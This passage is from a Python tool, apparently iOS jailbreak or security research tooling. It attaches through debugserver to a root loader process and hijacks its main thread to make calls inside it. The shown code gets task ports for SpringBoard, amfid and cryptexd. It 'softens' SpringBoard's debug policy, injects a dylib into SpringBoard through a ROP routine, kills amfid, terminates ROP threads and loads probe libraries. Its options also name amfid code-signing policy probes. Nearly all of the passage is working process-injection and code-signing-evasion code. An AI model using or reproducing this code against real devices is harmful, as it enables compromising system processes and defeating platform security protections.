    for offset, expected in EXPECTED_LOADER_CODE.items():
        address = image_base + offset
        observed = await read_memory(remote, address, len(expected))
        if observed != expected:
            raise ProtocolError(
                f"loader code mismatch at offset 0x{offset:x}: "
                f"{observed.hex()}"
            )


async def continue_thread_with_signal(
    remote: GDBRemote, thread: str, signal: int
) -> str:
    await remote.connection.sendall(
        frame_packet(f"vCont;C{signal:02x}:{thread}")
    )
    while True:
        response = await remote.packet()
        if response.startswith("O") and len(response) > 1:
            try:
                output = bytes.fromhex(response[1:]).decode(
                    "utf-8", "replace"
                )
            except ValueError:
                output = response
            print(f"loader-output={output.rstrip()}")
            continue
        if response[:1] in {"T", "S", "W", "X"}:
            return response
        raise ProtocolError(
            f"unexpected signalled-continue response: {response!r}"
        )


async def run(args: argparse.Namespace) -> int:
    if args.pid <= 1 or args.expected_parent <= 1:
        raise ProtocolError("refusing PID 1 or an invalid PID")
    resident_target = (
        args.resident_inject_hook
        if args.resident_inject_hook is not None
        else args.resident_inject_canary
    )
    resident_injection_mode = resident_target is not None
    requested_target = (
        args.thread_probe
        if args.thread_probe is not None
        else (
            args.jsc_probe
            if args.jsc_probe is not None
            else (
                args.donor_remap_probe
                if args.donor_remap_probe is not None
                else (
                    args.cleanup_rop_thread
                    if args.cleanup_rop_thread is not None
                    else (
                        args.amfid_policy_probe
                        if args.amfid_policy_probe is not None
                        else (
                            args.amfid_method_inventory
                            if args.amfid_method_inventory is not None
                            else (
                                args.amfid_adhoc_option_inspect
                                if args.amfid_adhoc_option_inspect is not None
                                else (
                                    args.amfid_lazy_load_preflight
                                    if args.amfid_lazy_load_preflight
                                    is not None
                                    else (
                                        args.amfid_adhoc_option_probe
                                        if args.amfid_adhoc_option_probe
                                        is not None
                                        else (
                                            args.amfid_mis_branch_probe
                                            if args.amfid_mis_branch_probe
                                            is not None
                                            else (
                                                args.amfid_debug_state_preflight
                                                if args.amfid_debug_state_preflight
                                                is not None
                                                else (
                                                    args.amfid_hwbp_redirect_probe
                                                    if args.amfid_hwbp_redirect_probe
                                                    is not None
                                                    else (
                                                        args.amfid_restart_recovery
                                                        if args.amfid_restart_recovery
                                                        is not None
                                                        else args.cryptexd_launch_type1_register
                                                    )
                                                )
                                            )
                                        )
                                    )
                                )
                            )
                        )
                    )
                )
            )
        )
    )
    if resident_injection_mode:
        requested_target = resident_target
    if requested_target is not None and requested_target <= 1:
        raise ProtocolError("refusing PID 1 or an invalid SpringBoard PID")
    if args.timeout <= 0 or args.timeout > 120:
        raise ProtocolError("timeout must be in the range (0, 120]")
    if not (0 < args.amfid_policy_hold_seconds <= 60):
        raise ProtocolError(
            "amfid policy hold must be in the range (0, 60]"
        )
    if (
        args.amfid_state_only_control
        and args.amfid_hwbp_redirect_probe is None
    ):
        raise ProtocolError(
            "--amfid-state-only-control requires "
            "--amfid-hwbp-redirect-probe"
        )
    if (
        args.amfid_state_advance_control
        and not args.amfid_state_only_control
    ):
        raise ProtocolError(
            "--amfid-state-advance-control requires "
            "--amfid-state-only-control"
        )
    donor_mode = args.donor_remap_probe is not None
    cryptexd_mode = args.cryptexd_launch_type1_register is not None
    if args.cryptexd_original_xpcproxy_control and not cryptexd_mode:
        raise ProtocolError(
            "--cryptexd-original-xpcproxy-control requires "
            "--cryptexd-launch-type1-register"
        )
    if args.cryptexd_springboard_candidate_job and not cryptexd_mode:
        raise ProtocolError(
            "--cryptexd-springboard-candidate-job requires "
            "--cryptexd-launch-type1-register"
        )
    if args.cryptexd_sealed_springboard_job and not cryptexd_mode:
        raise ProtocolError(
            "--cryptexd-sealed-springboard-job requires "
            "--cryptexd-launch-type1-register"
        )
    amfid_mode = (
        args.amfid_policy_probe is not None
        or args.amfid_method_inventory is not None
        or args.amfid_adhoc_option_inspect is not None
        or args.amfid_lazy_load_preflight is not None
        or args.amfid_adhoc_option_probe is not None
        or args.amfid_mis_branch_probe is not None
        or args.amfid_debug_state_preflight is not None
        or args.amfid_hwbp_redirect_probe is not None
        or args.amfid_restart_recovery is not None
    )
    if donor_mode:
        if args.donor_pid is None or args.donor_pid <= 1:
            raise ProtocolError("donor remap requires a non-PID-1 donor")
        if args.donor_address is not None and (
            args.donor_address <= 0
            or args.donor_address & (DONOR_PAGE_SIZE - 1)
        ):
            raise ProtocolError(
                "donor remap requires a 0x4000-aligned donor address"
            )
    elif args.donor_pid is not None or args.donor_address is not None:
        raise ProtocolError(
            "--donor-pid/--donor-address require --donor-remap-probe"
        )

    rsd_context = (
        PreferredRsdTunnel(
            serial=args.userspace_udid,
            prefer_native=False,
        )
        if args.userspace_udid
        else RemoteServiceDiscoveryService((args.host, args.port))
    )
    async with rsd_context as rsd:
        connection = await rsd.create_service_connection(
            rsd.get_service_port(DEBUG_PROXY_SERVICE)
        )
        remote = GDBRemote(connection, args.timeout)
        attached = False
        stopped = False
        breakpoint_address: int | None = None
        state_saved = False
        save_identifier: str | None = None
        scratch: int | None = None
        main_stack_pointer: int | None = None
        main_stack_backup: bytes | None = None
        live_code_patch_originals: dict[int, bytes] = {}
        primary_error: BaseException | None = None
        try:
            await connection.sendall(b"+")
            print(f"debugserver-supported={await remote.command('qSupported')}")
            optional = await remote.command("QEnableErrorStrings")
            if optional not in {"", "OK"}:
                raise ProtocolError(
                    f"QEnableErrorStrings failed: {optional!r}"
                )

            attach_response = await remote.command(f"vAttach;{args.pid:x}")
            attached = True
            stopped = True
            state = StopState.parse(attach_response)
            process_response = await remote.command("qProcessInfo")
            process = parse_key_values(process_response)
            if "pid" not in process:
                raise ProtocolError(
                    f"qProcessInfo omitted PID: {process_response!r}"
                )
            actual_pid = int(process["pid"], 16)
            parent = int(process.get("parent-pid", "0"), 16)
            name = decode_process_name(process.get("name", ""))
            if actual_pid != args.pid or actual_pid <= 1:
                raise ProtocolError(
                    f"attached PID mismatch: expected {args.pid}, "
                    f"got {actual_pid}"
                )
            # debugserver becomes the tracer reported in parent-pid while an
            # already-owned child is attached.  Ownership is checked through
            # the carrier's waitpid lane before this script is invoked; the
            # executable path, UUID, architecture, uid and exact PID remain
            # authoritative here.
            parent_note = (
                "carrier"
                if parent == args.expected_parent
                else "debugserver-tracer"
            )
            for key in ("uid", "euid"):
                if key in process and int(process[key], 16) != 0:
                    raise ProtocolError(
                        f"loader child is not root: {key}={process[key]}"
                    )
            print(
                f"loader-process pid={actual_pid} parent={parent} "
                f"parent-role={parent_note} expected-owner="
                f"{args.expected_parent} "
                f"name={name!r} thread={state.thread} "
                f"pc=0x{state.pc:x} signal={state.signal}"
            )
            region = await remote.command(
                f"qMemoryRegionInfo:{state.pc:x}"
            )
            print(f"loader-stop-region={region}")

            libraries_request = json.dumps(
                {"fetch_all_solibs": True}, separators=(",", ":")
            )
            libraries_response = await remote.command(
                "jGetLoadedDynamicLibrariesInfos:" + libraries_request
            )
            images = find_inventory_images(
                libraries_response, EXPECTED_CARRIER_UUID, LOADER_SUFFIX
            )
            print(
                f"loader-inventory-bytes={len(libraries_response)} "
                f"loader-matches={len(images)}"
            )
            if len(images) != 1:
                snippet = re.sub(r"\s+", " ", libraries_response[:1000])
                raise ProtocolError(
                    "expected exactly one trusted loader image in the "
                    f"suspended child; inventory={snippet!r}"
                )
            image_base, image_path = images[0]
            observed_uuid = await validate_loader_image(remote, image_base)
            await validate_loader_code(remote, image_base)
            main_address = image_base + MAIN_OFFSET
            print(
                f"loader-image base=0x{image_base:x} uuid={observed_uuid} "
                f"path={image_path} main=0x{main_address:x}"
            )
            if args.inspect_only:
                print("ptrauth-loader-inspect=success")
                return 0

            if state.signal != 17:
                raise ProtocolError(
                    "loader child is not at its initial SIGSTOP: "
                    f"signal={state.signal}"
                )
            await expect_ok(remote, f"Z1,{main_address:x},4")
            breakpoint_address = main_address
            stopped = False
            main_response = await continue_thread_with_signal(
                remote, state.thread, 19
            )
            main_state = StopState.parse(main_response)
            stopped = True
            if (
                main_state.thread.lower() != state.thread.lower()
                or main_state.pc != main_address
            ):
                raise ProtocolError(
                    "loader did not reach its exact main entry: "
                    f"thread={main_state.thread} pc=0x{main_state.pc:x}"
                )
            print(
                f"loader-main-reached thread={main_state.thread} "
                f"pc=0x{main_state.pc:x} signal={main_state.signal}"
            )

            save_response = await remote.command(
                f"QSaveRegisterState;thread:{main_state.thread};"
            )
            if not re.fullmatch(r"[0-9]+", save_response):
                raise ProtocolError(
                    f"QSaveRegisterState failed: {save_response!r}"
                )
            save_identifier = save_response
            state_saved = True
            scratch = await allocate_scratch(remote)
            print(f"loader-scratch=0x{scratch:x}")
            main_stack_pointer = await read_register(
                remote, "1f", main_state.thread
            )
            if main_stack_pointer == 0 or main_stack_pointer & 0xF:
                raise ProtocolError(
                    f"loader main stack is invalid: "
                    f"0x{main_stack_pointer:x}"
                )
            main_stack_backup = await read_memory(
                remote, main_stack_pointer, STACK_BACKUP_SIZE
            )
            print(f"loader-main-stack=0x{main_stack_pointer:x}")

            if (
                args.jsc_probe is not None
                or donor_mode
                or amfid_mode
                or cryptexd_mode
            ):
                for offset, original in ARB_CALL_THREAD_QUIESCE_PATCHES.items():
                    address = image_base + offset
                    observed = await read_memory(remote, address, 4)
                    if observed != original:
                        raise ProtocolError(
                            "arbCall quiesce patch precondition failed at "
                            f"offset 0x{offset:x}: {observed.hex()}"
                        )
                    live_code_patch_originals[offset] = original
                    await write_memory(remote, address, ARM64_NOP)
                    verified = await read_memory(remote, address, 4)
                    if verified != ARM64_NOP:
                        raise ProtocolError(
                            "arbCall quiesce patch verification failed at "
                            f"offset 0x{offset:x}: {verified.hex()}"
                        )
                print(
                    "loader-arbcall-thread-quiesce=disabled "
                    f"sites={len(live_code_patch_originals)}"
                )

            async def call_loader(
                name: str,
                function: int,
                arguments: tuple[int, ...],
                variadic_stack_start: int | None = None,
            ) -> int:
                nonlocal stopped
                if len(arguments) > 16:
                    raise ProtocolError(
                        f"too many register arguments for {name}"
                    )
                if variadic_stack_start is not None:
                    if not (
                        0 <= variadic_stack_start <= len(arguments)
                        and variadic_stack_start <= 8
                    ):
                        raise ProtocolError(
                            f"invalid variadic stack start for {name}"
                        )
                    register_arguments = arguments[:variadic_stack_start]
                    stack_arguments = arguments[variadic_stack_start:]
                else:
                    register_arguments = arguments[:8]
                    stack_arguments = arguments[8:]
                registers = {
                    f"{index:x}": value
                    for index, value in enumerate(register_arguments)
                }
                if stack_arguments:
                    stack_values = b"".join(
                        struct.pack("<Q", value)
                        for value in stack_arguments
                    )
                    stack_values += b"\0" * (
                        (-len(stack_values)) & 0xF
                    )
                    if len(stack_values) > STACK_BACKUP_SIZE:
                        raise ProtocolError(
                            f"too many stack arguments for {name}"
                        )
                    await write_memory(
                        remote, main_stack_pointer, stack_values
                    )
                registers["1f"] = main_stack_pointer
                registers["1e"] = main_address
                registers["20"] = function
                for register, value in registers.items():
                    await set_register(
                        remote, register, value, main_state.thread
                    )
                for register, expected in registers.items():
                    observed = await read_register(
                        remote, register, main_state.thread
                    )
                    if observed != expected:
                        raise ProtocolError(
                            f"{name} register {register} mismatch: "
                            f"expected 0x{expected:x}, got 0x{observed:x}"
                        )
                stopped = False
                response = await remote.continue_thread(main_state.thread)
                returned = StopState.parse(response)
                stopped = True
                if (
                    returned.thread.lower() != main_state.thread.lower()
                    or returned.pc != main_address
                ):
                    raise ProtocolError(
                        f"{name} did not return to loader main: "
                        f"thread={returned.thread} pc=0x{returned.pc:x}"
                    )
                print(
                    f"loader-call name={name} function=0x{function:x} "
                    f"result=0x{returned.x0:x}"
                )
                return returned.x0

            if args.run_exec_candidate_trace_probe:
                task_self_pointer_raw = struct.unpack(
                    "<Q",
                    await read_memory(
                        remote, image_base + MACH_TASK_SELF_GOT_OFFSET, 8
                    ),
                )[0]
                task_self_pointer = task_self_pointer_raw & USER_VA_MASK
                if task_self_pointer == 0 or task_self_pointer & 3:
                    raise ProtocolError(
                        "loader mach_task_self_ pointer is invalid: "
                        f"0x{task_self_pointer_raw:x}"
                    )
                task_self = struct.unpack(
                    "<I", await read_memory(remote, task_self_pointer, 4)
                )[0]
                if task_self == 0:
                    raise ProtocolError("loader mach_task_self_ port is null")

                local_dyld_info_address = scratch + LOCAL_DYLD_INFO_OFFSET
                local_dyld_count_address = scratch + LOCAL_DYLD_COUNT_OFFSET
                await write_memory(remote, local_dyld_info_address, b"\0" * 24)
                await write_memory(
                    remote,
                    local_dyld_count_address,
                    struct.pack("<I", TASK_DYLD_INFO_COUNT),
                )
                local_dyld_result = await call_loader(
                    "task_info_loader_dyld_exec_candidate_probe",
                    image_base + TASK_INFO_STUB_OFFSET,
                    (
                        task_self,
                        TASK_DYLD_INFO,
                        local_dyld_info_address,
                        local_dyld_count_address,
                    ),
                )
                if local_dyld_result & 0xFFFFFFFF:
                    raise ProtocolError(
                        "loader TASK_DYLD_INFO failed: "
                        f"{local_dyld_result & 0xFFFFFFFF}"
                    )
                local_all_image_info = struct.unpack(
                    "<Q", await read_memory(remote, local_dyld_info_address, 8)
                )[0]
                if local_all_image_info == 0:
                    raise ProtocolError(
                        "loader TASK_DYLD_INFO returned null"
                    )

                async def set_probe_string(value: str, offset: int) -> int:
                    encoded = value.encode("utf-8") + b"\0"
                    if len(encoded) > 0x100:
                        raise ProtocolError("probe string is too long")
                    address = scratch + offset
                    await write_memory(
                        remote, address, encoded + b"\0" * (0x100 - len(encoded))
                    )
                    return address

                libdyld_path = await set_probe_string(LIBDYLD_PATH, 0x000)
                libdyld_image_raw = await call_loader(
                    "getRemoteImageAddress_loader_exec_candidate_probe",
                    image_base + GET_REMOTE_IMAGE_ADDRESS_OFFSET,
                    (task_self, local_all_image_info, libdyld_path),
                )
                libdyld_image = libdyld_image_raw & USER_VA_MASK
                dlopen_symbol = await set_probe_string("_dlopen", 0x100)
                dlopen_raw = await call_loader(
                    "remoteDlSym_loader_dlopen_exec_candidate_probe",
                    image_base + REMOTE_DLSYM_OFFSET,
                    (task_self, libdyld_image, dlopen_symbol),
                )
                dlopen_address = dlopen_raw & USER_VA_MASK
                if libdyld_image == 0 or dlopen_address == 0:
                    raise ProtocolError("could not resolve loader-local dlopen")

                probe_path = await set_probe_string(
                    EXEC_CANDIDATE_TRACE_PROBE_PATH, 0x200
                )
                probe_handle_raw = await call_loader(
                    "dlopen_exec_candidate_trace_probe",
                    dlopen_address,
                    (probe_path, RTLD_NOW_LOCAL),
                )
                probe_handle = probe_handle_raw & USER_VA_MASK
                if probe_handle == 0:
                    dlerror_symbol = await set_probe_string("_dlerror", 0x400)
                    dlerror_raw = await call_loader(
                        "remoteDlSym_loader_dlerror_exec_candidate_probe",
                        image_base + REMOTE_DLSYM_OFFSET,
                        (task_self, libdyld_image, dlerror_symbol),
                    )
                    dlerror_address = dlerror_raw & USER_VA_MASK
                    error_text = "unavailable"
                    if dlerror_address != 0:
                        error_pointer_raw = await call_loader(
                            "dlerror_exec_candidate_trace_probe",
                            dlerror_address,
                            (),
                        )
                        error_pointer = error_pointer_raw & USER_VA_MASK
                        if error_pointer != 0:
                            error_bytes = bytearray()
                            while len(error_bytes) < 1024:
                                chunk = await read_memory(
                                    remote,
                                    error_pointer + len(error_bytes),
                                    min(64, 1024 - len(error_bytes)),
                                )
                                terminator = chunk.find(b"\0")
                                if terminator >= 0:
                                    error_bytes.extend(chunk[:terminator])
                                    break
                                error_bytes.extend(chunk)
                            error_text = error_bytes.decode(
                                "utf-8", "replace"
                            )
                    raise ProtocolError(
                        "loader-local exec candidate probe dlopen failed: "
                        f"{error_text}"
                    )

                probe_image_raw = await call_loader(
                    "getRemoteImageAddress_exec_candidate_trace_probe",
                    image_base + GET_REMOTE_IMAGE_ADDRESS_OFFSET,
                    (task_self, local_all_image_info, probe_path),
                )
                probe_image = probe_image_raw & USER_VA_MASK
                probe_symbol = await set_probe_string(
                    EXEC_CANDIDATE_TRACE_PROBE_SYMBOL, 0x300
                )
                probe_start_raw = await call_loader(
                    "remoteDlSym_exec_candidate_trace_probe_start",
                    image_base + REMOTE_DLSYM_OFFSET,
                    (task_self, probe_image, probe_symbol),
                )
                probe_start = probe_start_raw & USER_VA_MASK
                if probe_image == 0 or probe_start == 0:
                    raise ProtocolError(
                        "could not resolve exec candidate probe entry"
                    )
                start_result = await call_loader(
                    "exec_candidate_trace_probe_start_async",
                    probe_start,
                    (),
                )
                if start_result & 0xFFFFFFFF:
                    raise ProtocolError(
                        "exec candidate trace probe start failed: "
                        f"{start_result & 0xFFFFFFFF}"
                    )
                print(
                    "exec-candidate-trace-probe=started "
                    f"loader={args.pid} image=0x{probe_image:x} "
                    "dlclose=omitted removal=reboot"
                )
                return 0

            target_pid = requested_target
            path_address = scratch + PATH_BUFFER_OFFSET
            task_address = scratch + TASK_PORT_OFFSET
            dyld_info_address = scratch + DYLD_INFO_OFFSET
            dyld_count_address = scratch + DYLD_INFO_COUNT_OFFSET
            remote_thread_address = scratch + REMOTE_THREAD_OFFSET
            call_return_address = scratch + CALL_RETURN_OFFSET
            libsystem_path_address = scratch + LIBSYSTEM_PATH_OFFSET
            getpid_symbol_address = scratch + GETPID_SYMBOL_OFFSET
            target_task = 0
            donor_task = 0
            donor_validated = False
            donor_remap_address = 0
            remote_thread = 0
            remote_thread_owned = False
            call_thread = 0
            jsc_worker_thread = 0
            jsc_pthread_handle = 0
            pthread_exit_address = 0
            pthread_join_address = 0
            task_self = 0
            remote_allocations: list[tuple[int, int, str]] = []
            probe_error: BaseException | None = None
            try:
                await write_memory(
                    remote, path_address, b"\0" * PATH_BUFFER_SIZE
                )
                path_result_raw = await call_loader(
                    "proc_pidpath",
                    image_base + PROC_PIDPATH_STUB_OFFSET,
                    (target_pid, path_address, PATH_BUFFER_SIZE),
                )
                path_result = struct.unpack(
                    "<i", struct.pack("<I", path_result_raw & 0xFFFFFFFF)
                )[0]
                if path_result <= 0 or path_result >= PATH_BUFFER_SIZE:
                    raise ProtocolError(
                        f"proc_pidpath failed for PID {target_pid}: "
                        f"{path_result}"
                    )
                target_path = (
                    await read_memory(remote, path_address, path_result + 1)
                ).split(b"\0", 1)[0].decode("utf-8", "strict")
                expected_target_path = (
                    AMFID_PATH
                    if amfid_mode
                    else (CRYPTEXD_PATH if cryptexd_mode else SPRINGBOARD_PATH)
                )
                if target_path != expected_target_path:
                    raise ProtocolError(
                        f"refusing unexpected target PID {target_pid}: "
                        f"expected {expected_target_path!r}, got "
                        f"{target_path!r}"
                    )
                print(
                    f"thread-probe-target pid={target_pid} path={target_path}"
                )

                task_self_pointer_raw = struct.unpack(
                    "<Q",
                    await read_memory(
                        remote, image_base + MACH_TASK_SELF_GOT_OFFSET, 8
                    ),
                )[0]
                task_self_pointer = (
                    task_self_pointer_raw & 0x0000FFFFFFFFFFFF
                )
                if task_self_pointer == 0 or task_self_pointer & 3:
                    raise ProtocolError(
                        "loader mach_task_self_ pointer is invalid: "
                        f"0x{task_self_pointer_raw:x}"
                    )
                task_self = struct.unpack(
                    "<I", await read_memory(remote, task_self_pointer, 4)
                )[0]
                if task_self == 0:
                    raise ProtocolError("loader mach_task_self_ port is null")

                await write_memory(remote, task_address, b"\0" * 8)
                task_result = await call_loader(
                    "task_for_pid",
                    image_base + TASK_FOR_PID_STUB_OFFSET,
                    (task_self, target_pid, task_address),
                )
                if task_result & 0xFFFFFFFF:
                    raise ProtocolError(
                        f"task_for_pid({target_pid}) failed: "
                        f"{task_result & 0xFFFFFFFF}"
                    )
                target_task = struct.unpack(
                    "<I", await read_memory(remote, task_address, 4)
                )[0]
                if target_task == 0:
                    raise ProtocolError("task_for_pid returned a null port")
                print(f"thread-probe-task-port=0x{target_task:x}")

                if args.amfid_restart_recovery is not None:
                    kill_result_raw = await call_loader(
                        "kill_amfid_restart_recovery",
                        image_base + KILL_STUB_OFFSET,
                        (target_pid, SIGKILL),
                    )
                    kill_result = struct.unpack(
                        "<i", struct.pack("<I", kill_result_raw & 0xFFFFFFFF)
                    )[0]
                    if kill_result != 0:
                        raise ProtocolError(
                            "exact amfid recovery termination failed: "
                            f"{kill_result}"
                        )
                    await asyncio.sleep(1.0)
                    print(
                        "amfid-restart-recovery=success "
                        f"terminated-pid={target_pid}"
                    )
                    return 0

                await write_memory(remote, dyld_info_address, b"\0" * 24)
                await write_memory(
                    remote,
                    dyld_count_address,
                    struct.pack("<I", TASK_DYLD_INFO_COUNT),
                )
                task_info_result = await call_loader(
                    "task_info_dyld",
                    image_base + TASK_INFO_STUB_OFFSET,
                    (
                        target_task,
                        TASK_DYLD_INFO,
                        dyld_info_address,
                        dyld_count_address,
                    ),
                )
                if task_info_result & 0xFFFFFFFF:
                    raise ProtocolError(
                        "TASK_DYLD_INFO failed: "
                        f"{task_info_result & 0xFFFFFFFF}"
                    )
                all_image_info, all_image_info_size, image_format = (
                    struct.unpack(
                        "<QQi4x",
                        await read_memory(remote, dyld_info_address, 24),
                    )
                )
                if (
                    all_image_info == 0
                    or all_image_info_size == 0
                    or image_format != 1
                ):
                    raise ProtocolError(
                        "invalid SpringBoard dyld info: "
                        f"address=0x{all_image_info:x} "
                        f"size=0x{all_image_info_size:x} "
                        f"format={image_format}"
                    )
                print(
                    f"thread-probe-dyld address=0x{all_image_info:x} "
                    f"size=0x{all_image_info_size:x}"
                )

                if resident_injection_mode:
                    soften_result = await call_loader(
                        "soften_target_resident",
                        image_base + SOFTEN_TARGET_OFFSET,
                        (target_pid, path_address),
                    )
                    if (soften_result & 1) == 0:
                        raise ProtocolError(
                            "SpringBoard debug-policy softening failed"
                        )

                    requested_dylib = (
                        RESIDENT_HOOK_PATH
                        if args.resident_inject_hook is not None
                        else RESIDENT_CANARY_PATH
                    )
                    requested_bytes = requested_dylib.encode("utf-8") + b"\0"
                    if len(requested_bytes) > PATH_BUFFER_SIZE:
                        raise ProtocolError("resident dylib path is too long")
                    await write_memory(
                        remote,
                        path_address,
                        requested_bytes
                        + b"\0" * (PATH_BUFFER_SIZE - len(requested_bytes)),
                    )
                    resolved_address = scratch + LOCAL_STRING_OFFSET
                    await write_memory(
                        remote, resolved_address, b"\0" * LOCAL_STRING_SIZE
                    )
                    realpath_raw = await call_loader(
                        "realpath_resident_dylib",
                        image_base + REALPATH_STUB_OFFSET,
                        (path_address, resolved_address),
                    )
                    if (realpath_raw & USER_VA_MASK) != resolved_address:
                        raise ProtocolError(
                            f"realpath failed for {requested_dylib}"
                        )
                    resolved_bytes = await read_memory(
                        remote, resolved_address, LOCAL_STRING_SIZE
                    )
                    if b"\0" not in resolved_bytes:
                        raise ProtocolError(
                            "resolved resident dylib path is unterminated"
                        )
                    resolved_dylib = resolved_bytes.split(b"\0", 1)[0].decode(
                        "utf-8", "strict"
                    )
                    expected_suffix = (
                        "/procursus/usr/lib/"
                        + requested_dylib.rsplit("/", 1)[-1]
                    )
                    if not (
                        resolved_dylib.startswith("/private/preboot/")
                        and resolved_dylib.endswith(expected_suffix)
                    ):
                        raise ProtocolError(
                            "refusing unexpected resident dylib realpath: "
                            f"{resolved_dylib!r}"
                        )

                    before_raw = await call_loader(
                        "getRemoteImageAddress_resident_before",
                        image_base + GET_REMOTE_IMAGE_ADDRESS_OFFSET,
                        (target_task, all_image_info, resolved_address),
                    )
                    before = before_raw & USER_VA_MASK
                    if before == 0:
                        await call_loader(
                            "injectDylibViaRop_resident",
                            image_base + INJECT_DYLIB_VIA_ROP_OFFSET,
                            (
                                target_task,
                                target_pid,
                                resolved_address,
                                all_image_info,
                            ),
                        )
                        await asyncio.sleep(0.25)

                    after_raw = await call_loader(
                        "getRemoteImageAddress_resident_after",
                        image_base + GET_REMOTE_IMAGE_ADDRESS_OFFSET,
                        (target_task, all_image_info, resolved_address),
                    )
                    after = after_raw & USER_VA_MASK
                    if after == 0:
                        raise ProtocolError(
                            "resident dylib is absent after injection"
                        )
                    print(
                        "springboard-resident-injection=success "
                        f"pid={target_pid} image=0x{after:x} "
                        f"alreadyLoaded={'true' if before else 'false'} "
                        f"path={resolved_dylib} dlclose=omitted "
                        "removal=reboot"
                    )
                    return 0

                if args.cleanup_rop_thread is not None:
                    await call_loader(
                        "prepareForMagic_cleanup",
                        image_base + PREPARE_FOR_MAGIC_OFFSET,
                        (target_task, all_image_info),
                    )
                    rop_loop_raw = struct.unpack(
                        "<Q",
                        await read_memory(
                            remote,
                            image_base + ROP_LOOP_STORAGE_OFFSET,
                            8,
                        ),
                    )[0]
                    rop_loop = rop_loop_raw & USER_VA_MASK
                    if rop_loop == 0:
                        raise ProtocolError(
                            "prepareForMagic produced a null ROP loop"
                        )
                    thread_array_address = scratch + THREAD_ARRAY_OFFSET
                    thread_count_address = scratch + THREAD_COUNT_OFFSET
                    await write_memory(
                        remote, thread_array_address, b"\0" * 8
                    )
                    await write_memory(
                        remote, thread_count_address, b"\0" * 8
                    )
                    threads_result = await call_loader(
                        "task_threads_cleanup",
                        image_base + TASK_THREADS_STUB_OFFSET,
                        (
                            target_task,
                            thread_array_address,
                            thread_count_address,
                        ),
                    )
                    if threads_result & 0xFFFFFFFF:
                        raise ProtocolError(
                            "task_threads failed: "
                            f"{threads_result & 0xFFFFFFFF}"
                        )
                    thread_array_raw = struct.unpack(
                        "<Q", await read_memory(remote, thread_array_address, 8)
                    )[0]
                    thread_array = thread_array_raw & 0x0000FFFFFFFFFFFF
                    thread_count = struct.unpack(
                        "<I", await read_memory(remote, thread_count_address, 4)
                    )[0]
                    if (
                        thread_array == 0
                        or thread_count == 0
                        or thread_count > 1024
                    ):
                        raise ProtocolError(
                            "task_threads returned invalid output: "
                            f"array=0x{thread_array:x} count={thread_count}"
                        )
                    thread_ports = list(
                        struct.unpack(
                            f"<{thread_count}I",
                            await read_memory(
                                remote, thread_array, thread_count * 4
                            ),
                        )
                    )
                    matching_threads: list[int] = []
                    state_address = scratch + THREAD_STATE_OFFSET
                    state_count_address = scratch + THREAD_STATE_COUNT_OFFSET
                    for thread_port in thread_ports:
                        if thread_port == 0:
                            continue
                        await write_memory(
                            remote,
                            state_address,
                            b"\0" * (ARM_THREAD_STATE64_COUNT * 4),
                        )
                        await write_memory(
                            remote,
                            state_count_address,
                            struct.pack("<I", ARM_THREAD_STATE64_COUNT),
                        )
                        state_result = await call_loader(
                            "thread_get_state_cleanup",
                            image_base + THREAD_GET_STATE_STUB_OFFSET,
                            (
                                thread_port,
                                ARM_THREAD_STATE64,
                                state_address,
                                state_count_address,
                            ),
                        )
                        if state_result & 0xFFFFFFFF:
                            continue
                        pc_raw = struct.unpack(
                            "<Q",
                            await read_memory(
                                remote,
                                state_address + ARM_THREAD_STATE64_PC_OFFSET,
                                8,
                            ),
                        )[0]
                        if (pc_raw & USER_VA_MASK) == rop_loop:
                            matching_threads.append(thread_port)
                    print(
                        f"rop-thread-inventory total={thread_count} "
                        f"loop=0x{rop_loop:x} "
                        f"matches={len(matching_threads)}"
                    )
                    if len(matching_threads) != 1:
                        raise ProtocolError(
                            "refusing ambiguous ROP-thread cleanup: "
                            f"matches={len(matching_threads)}"
                        )
                    terminate_result = await call_loader(
                        "thread_terminate_orphan_rop_loop",
                        image_base + THREAD_TERMINATE_STUB_OFFSET,
                        (matching_threads[0],),
                    )
                    if terminate_result & 0xFFFFFFFF:
                        raise ProtocolError(
                            "orphan thread termination failed: "
                            f"{terminate_result & 0xFFFFFFFF}"
                        )
                    # The short-lived loader child owns the enumerated send
                    # rights and OOL array.  Let its imminent process exit
                    # release them atomically; individually deallocating the
                    # post-termination array can race dead-name conversion.
                    print(
                        "springboard-orphan-rop-thread-cleanup=success"
                    )
                    return 0

                libsystem_path = (
                    b"/usr/lib/system/libsystem_kernel.dylib\0"
                )
                getpid_symbol = b"_getpid\0"
                await write_memory(
                    remote, libsystem_path_address, libsystem_path
                )
                await write_memory(
                    remote, getpid_symbol_address, getpid_symbol
                )
                libsystem_base_raw = await call_loader(
                    "getRemoteImageAddress_libsystem_kernel",
                    image_base + GET_REMOTE_IMAGE_ADDRESS_OFFSET,
                    (
                        target_task,
                        all_image_info,
                        libsystem_path_address,
                    ),
                )
                libsystem_base = (
                    libsystem_base_raw & 0x0000FFFFFFFFFFFF
                )
                if libsystem_base == 0:
                    raise ProtocolError(
                        "could not locate SpringBoard libsystem_kernel"
                    )
                getpid_address_raw = await call_loader(
                    "remoteDlSym_getpid",
                    image_base + REMOTE_DLSYM_OFFSET,
                    (
                        target_task,
                        libsystem_base,
                        getpid_symbol_address,
                    ),
                )
                getpid_address = (
                    getpid_address_raw & 0x0000FFFFFFFFFFFF
                )
                if getpid_address == 0:
                    raise ProtocolError(
                        "could not resolve SpringBoard's signed getpid"
                    )
                print(
                    f"thread-probe-symbol libsystem=0x{libsystem_base:x} "
                    f"getpid=0x{getpid_address:x}"
                )

                await call_loader(
                    "prepareForMagic",
                    image_base + PREPARE_FOR_MAGIC_OFFSET,
                    (target_task, all_image_info),
                )
                if (
                    args.jsc_probe is not None
                    and USE_EXPERIMENTAL_BORROWED_JSC_THREAD
                ):
                    # createRemotePthread aliases pthread_main_thread_np's
                    # pthread object onto a second kernel thread.  That is
                    # sufficient for simple C calls but deadlocks JSC's
                    # thread-aware initialization.  Borrow one real target
                    # thread instead; arbCall saves and restores its complete
                    # state around each bounded call.
                    thread_array_address = scratch + THREAD_ARRAY_OFFSET
                    thread_count_address = scratch + THREAD_COUNT_OFFSET
                    await write_memory(
                        remote, thread_array_address, b"\0" * 8
                    )
                    await write_memory(
                        remote, thread_count_address, b"\0" * 8
                    )
                    threads_result = await call_loader(
                        "task_threads_jsc",
                        image_base + TASK_THREADS_STUB_OFFSET,
                        (
                            target_task,
                            thread_array_address,
                            thread_count_address,
                        ),
                    )
                    if threads_result & 0xFFFFFFFF:
                        raise ProtocolError(
                            "task_threads for JSC failed: "
                            f"{threads_result & 0xFFFFFFFF}"
                        )
                    thread_array_raw = struct.unpack(
                        "<Q",
